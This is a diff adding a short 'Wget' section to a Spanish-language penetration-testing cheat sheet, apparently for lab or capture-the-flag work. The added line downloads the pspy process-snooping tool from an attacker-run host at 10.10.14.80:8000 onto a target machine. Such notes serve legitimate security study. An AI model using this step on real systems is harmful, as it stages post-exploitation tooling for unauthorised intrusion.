@@ -602,6 +602,13 @@ Usa el comando
 hostname -I
 
 ```
+## Wget
+
+Para descargar lo que sea copia y pega para que o estes escribiendo siempre lo mismo
+
+```
+wget http://10.10.14.80:8000/pspy
+```
 
 ## Impacket
 
